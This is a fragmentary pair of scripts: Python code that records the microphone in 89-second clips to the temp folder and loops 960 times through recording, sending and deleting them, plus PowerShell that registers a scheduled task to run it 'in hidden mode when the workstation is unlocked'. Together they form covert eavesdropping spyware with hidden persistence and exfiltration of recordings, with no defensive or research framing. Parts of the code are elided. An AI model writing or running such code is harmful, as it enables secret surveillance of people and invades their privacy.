...
duration = 89  # 89 seconds total duration to keep the file size around 7.5 MB
...
# Loop the recording, sending, and deletion process 960 times
for i in range(960):
    print(f"Loop iteration {i+1}/960")

    # Get the temp directory path
    try:
        temp_dir = tempfile.gettempdir()
        output_filename = f"mic_recording_{i+1}.wav"
...
# Create the scheduled task action to run the Python script directly
$action = New-ScheduledTaskAction -Execute $pythonExe -Argument "`"$pythonScriptPath`""
...
# Register the scheduled task with the name 'RunMicRecordingScript'
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName 'RunMicRecordingScript' -Description 'Runs the mic recording script in hidden mode when the workstation is unlocked'

Write-Host "Scheduled task 'RunMicRecordingScript' created successfully!"
Write-Host "Done."
